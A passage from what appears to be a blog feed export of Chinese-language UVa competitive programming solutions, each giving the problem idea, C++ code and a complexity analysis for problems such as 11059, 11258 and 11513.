IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=n ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			col[i][j] = col[i][j<span class="number">-1</span>]+arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;=n ; j++)&#123;</span><br><span class="line">			<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span> ; k&lt;=n ; k++)&#123;</span><br><span class="line">				sum+=col[k][j]-col[k][i<span class="number">-1</span>];</span><br><span class="line">				ans=max(ans,sum);</span><br><span class="line">				<span class="keyword">if</span>(sum&lt;<span class="number">0</span>) sum=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(n^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>前綴和</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11059</title>
    <url>/2021/03/23/UVa11059/</url>
    <content><![CDATA[<h1 id="UVa-11059"><a href="#UVa-11059" class="headerlink" title="UVa 11059"></a>UVa 11059</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11059" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11059</a></p>
<p>給一個序列，問最大連續元素的乘積</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為這題的 $N$ 很小，所以可以直接暴力做</p>
<p>枚舉開頭跟結尾，將其中的元素乘起來，並找出最大值</p>
<p>注意乘積可以到 $10^{18}$ ，記得開 long long</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">20</span>],Case=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans,tmp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="comment">// i 表示開頭</span></span><br><span class="line">			tmp=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;n ; j++)&#123;</span><br><span class="line">				<span class="comment">// j 表示結尾</span></span><br><span class="line">				tmp*=arr[j];</span><br><span class="line">				ans=max(ans,tmp);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;Case++&lt;&lt;<span class="string">": The maximum product is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n\n"</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>枚舉答案的時間複雜度為 $O(n^2)$</p>
<p>每筆測資總時間複雜度為 $O(n+n^2)$ 約為 $O(n^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11258</title>
    <url>/2020/06/23/UVa11258/</url>
    <content><![CDATA[<h1 id="UVa11258"><a href="#UVa11258" class="headerlink" title="UVa11258"></a>UVa11258</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11258" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11258</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>定義$DP[i][j]$為 $i$ ~ $j$ 的最佳解<br>設定轉移式 $DP[i][j] = max(DP[i][j], DP[i][k]+DP[k+1][j])$<br>其中， $k$ 符合 $i\leq k \leq j$<br>起初，我們可以假設$DP[i][j]$為 $i$ ~ $j$ 的數值<br>如果超過INT範圍則設定為0，也就是不會有這樣的可能<br>接下來針對每個$DP[i][j]$找最大值，答案即為$DP[0][s.size()-1]$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,dp[<span class="number">205</span>][<span class="number">205</span>];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">str_to_int</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> now=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">		now*=<span class="number">10</span>;</span><br><span class="line">		now+=(s[l]-<span class="string">'0'</span>);</span><br><span class="line">		l++;</span><br><span class="line">		<span class="keyword">if</span>(now&gt;INT_MAX)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;s.size() ; j++)&#123;</span><br><span class="line">				dp[i][j]=str_to_int(i,j);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;s.size() ; j++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> k=i ; k&lt;=j ; k++)&#123;</span><br><span class="line">					dp[i][j]=max(dp[i][j], dp[i][k]+dp[k+<span class="number">1</span>][j]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[<span class="number">0</span>][s.size()<span class="number">-1</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>假設s.size()為N<br>共有 $N^2$ 種狀態，每種狀態轉移複雜度為 $O(N)$，總複雜度$O(N^3)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 113</title>
    <url>/2021/03/23/UVa113/</url>
    <content><![CDATA[<h1 id="UVa-113"><a href="#UVa-113" class="headerlink" title="UVa 113"></a>UVa 113</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?113" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?113</a></p>
<p>給定兩個整數 $n$, $p$ ，求 $p$ 的 $n$ 次方根 $k$ ，且保證 $k$ 為整數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>$p$ 的 $n$ 次方根等同於 $p$ 的 $\frac{1}{n}$ 次方</p>
<p>直接使用內建的 <code>pow</code> 即可</p>
<p>有一點需要特別小心，因為 C++ 預設在輸出小數時如果太小，可能會變成以科學記號表示</p>
<p>要排除這種狀況，我們可以用之前學過的 <code>setprecision</code> 來解決</p>
<p><code>setprecision(n)</code> 等同四捨五入取到小數點後第 $n$ 位，這裡我們要取整數，所以放 0 </p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">double</span> n,p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;p)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">0</span>)&lt;&lt;<span class="built_in">pow</span>(p,<span class="number">1.0</span>/n)&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資時間複雜度可以視為 $O(1)$</p>
<p>不過詳細可以參考這篇: <a href="https://stackoverflow.com/questions/4638473/how-to-powreal-real-in-x86" target="_blank" rel="noopener">https://stackoverflow.com/questions/4638473/how-to-powreal-real-in-x86</a></p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11192</title>
    <url>/2020/07/02/UVa11192/</url>
    <content><![CDATA[<h1 id="UVa11192"><a href="#UVa11192" class="headerlink" title="UVa11192"></a>UVa11192</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11192" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11192</a><br>將字串分組反轉輸出</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用迴圈枚舉開頭輸出</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> g,n;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;g &amp;&amp; g)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		n=s.size()/g;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i+=n)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i+n<span class="number">-1</span> ; j&gt;=i ; j--)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;s[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s) \times n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11321</title>
    <url>/2021/03/23/UVa11321/</url>
    <content><![CDATA[<h1 id="UVa-11321"><a href="#UVa-11321" class="headerlink" title="UVa 11321"></a>UVa 11321</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11321" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11321</a></p>
<p>給定一個長度為 $n$ 的序列以及一個正整數 $m$</p>
<p>根據以下的規則排序</p>
<ul>
<li>若 $p % m &lt; q % m$<br>  $p$ 排在 $q$ 前面</li>
<li>若 $p % m &gt; q % m$<br>  $q$ 排在 $p$ 前面</li>
<li>若 $p % m = q % m$<ul>
<li>若 $p, q$ 皆為偶數<br>  小的排前面</li>
<li>若 $p, q$ 皆為奇數<br>  大的排前面</li>
<li>否則<br>  奇數的排前面</li>
</ul>
</li>
</ul>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>只需要根據題目的意思自訂 compare function 即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, arr[<span class="number">10010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a%m != b%m) <span class="keyword">return</span> a%m &lt; b%m;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(a%<span class="number">2</span>==<span class="number">0</span> &amp;&amp; b%<span class="number">2</span>==<span class="number">0</span>) <span class="keyword">return</span> a &lt; b;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">abs</span>(a%<span class="number">2</span>)==<span class="number">1</span> &amp;&amp; <span class="built_in">abs</span>(b%<span class="number">2</span>)==<span class="number">1</span>) <span class="keyword">return</span> a &gt; b;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">abs</span>(a%<span class="number">2</span>)==<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m &amp;&amp; (n!=<span class="number">0</span> &amp;&amp; m!=<span class="number">0</span>))&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		sort(arr, arr+n ,cmp);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="string">" "</span>&lt;&lt;m&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"0 0\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>每筆測資排序時間複雜度為 $O(nlogn)$</p>
<p>每筆測資輸出時間複雜度為 $O(n)$</p>
<p>每筆測資總時間複雜度為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 11541</title>
    <url>/2021/03/23/UVa11541/</url>
    <content><![CDATA[<h1 id="UVa-11541"><a href="#UVa-11541" class="headerlink" title="UVa 11541"></a>UVa 11541</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11541" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11541</a></p>
<p>給一個字串，內容都會是一個字元 $C$ 接著一串數字 $N$ ，表示要輸出 $N$ 個 $C$</p>
<p>例如: <code>A2B3C1</code> 表示 <code>AABBBC</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>分別用一個變數 $tmp$ 和 $cnt$ 紀錄當前要輸出的字元以及要輸出的次數</p>
<p>每次遇到數字，就把 $cnt*10$ ， 再將 $cnt$ 加上當前數字</p>
<p>這樣才可以進位，也因為如此， $cnt$ 的初始值要設定為 0</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> Case=<span class="number">1</span>,t,cnt=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">char</span> tmp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case "</span>&lt;&lt;Case++&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;=s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i!=s.size() &amp;&amp; s[i]&gt;=<span class="string">'0'</span> &amp;&amp; s[i]&lt;=<span class="string">'9'</span>)&#123;</span><br><span class="line">				cnt*=<span class="number">10</span>;</span><br><span class="line">				cnt+=s[i]-<span class="string">'0'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(cnt==<span class="number">0</span>)&#123;</span><br><span class="line">					tmp=s[i];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;cnt ; j++)&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;tmp;</span><br><span class="line">					&#125;</span><br><span class="line">					cnt=<span class="number">0</span>;</span><br><span class="line">					tmp=s[i];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>假設每次輸出的字元數量是 $N$，需要輸出的字元有 $M$ 個</p>
<p>那麼每筆測資的時間複雜度為 $O(NM)$</p>
<p>總時間複雜度為 $O(tNM)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa598</title>
    <url>/2020/06/16/UVa11513/</url>
    <content><![CDATA[<h1 id="UVa11513"><a href="#UVa11513" class="headerlink" title="UVa11513"></a>UVa11513</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11513" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11513</a><br>給一個 $3\times3$ 的拼圖，其中合法的移動方式有</p>
<ul>
<li>選擇其中一行向上移動</li>
<li>選擇其中一列向右移動</li>
</ul>
<p>問是否能透過以上操作回到原樣，若可以則輸出最小移動步數以及移動過程</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果正面BFS的話，單筆測資可能移動數量最高有 $9!$ 種，會TLE<br>因為最終都是回到同一個盤面上，因此反過來BFS即可<br>不過因為是反著走，走的方向也要相反<br>紀錄每個盤面是由甚麼移動轉換到下一個盤面即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> tmp;</span><br><span class="line"><span class="built_in">string</span> <span class="keyword">final</span>=<span class="string">"123456789"</span>,res;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,pair&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt;&gt; ans;</span><br><span class="line"><span class="built_in">string</span> input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">fix</span><span class="params">(<span class="built_in">string</span> s,<span class="keyword">int</span> line, <span class="keyword">int</span> type)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(type==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">//horizontal</span></span><br><span class="line">		<span class="keyword">int</span> px=line*<span class="number">3</span>;</span><br><span class="line">		<span class="keyword">char</span> a=s[px],b=s[px+<span class="number">1</span>],c=s[px+<span class="number">2</span>];</span><br><span class="line">		s[px]=b;</span><br><span class="line">		s[px+<span class="number">1</span>]=c;</span><br><span class="line">		s[px+<span class="number">2</span>]=a;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//straight</span></span><br><span class="line">		<span class="keyword">int</span> px=line;</span><br><span class="line">		<span class="keyword">char</span> a=s[px],b=s[px+<span class="number">3</span>],c=s[px+<span class="number">6</span>];</span><br><span class="line">		s[px]=c;</span><br><span class="line">		s[px+<span class="number">3</span>]=a;</span><br><span class="line">		s[px+<span class="number">6</span>]=b;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">fix_to_str</span><span class="params">(<span class="keyword">int</span> line, <span class="keyword">int</span> type)</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> ret;</span><br><span class="line">	<span class="keyword">if</span>(type==<span class="number">0</span>) ret=<span class="string">"H"</span>;</span><br><span class="line">	<span class="keyword">else</span> ret=<span class="string">"V"</span>;</span><br><span class="line">	ret+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+line);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">queue</span>&lt;<span class="built_in">string</span>&gt;q;</span><br><span class="line">	<span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">bool</span>&gt; inq;</span><br><span class="line">	q.emplace(<span class="keyword">final</span>);</span><br><span class="line">	inq[<span class="keyword">final</span>]=<span class="literal">true</span>;</span><br><span class="line">	ans[<span class="keyword">final</span>]=make_pair(<span class="string">"end"</span>,<span class="string">"end"</span>);</span><br><span class="line">	<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">		<span class="built_in">string</span> now=q.front();</span><br><span class="line">		q.pop();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">			res=fix(now,i,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(!inq.count(res))&#123;</span><br><span class="line">				ans[res]=make_pair(fix_to_str(i+<span class="number">1</span>,<span class="number">0</span>),now);</span><br><span class="line">				q.emplace(res);</span><br><span class="line">				inq[res]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res=fix(now,i,<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(!inq.count(res))&#123;</span><br><span class="line">				ans[res]=make_pair(fix_to_str(i+<span class="number">1</span>,<span class="number">1</span>),now);</span><br><span class="line">				q.emplace(res);</span><br><span class="line">				inq[res]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;input &amp;&amp; input!=<span class="string">"0"</span>)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">3</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(i==<span class="number">0</span> &amp;&amp; j==<span class="number">0</span>) <span 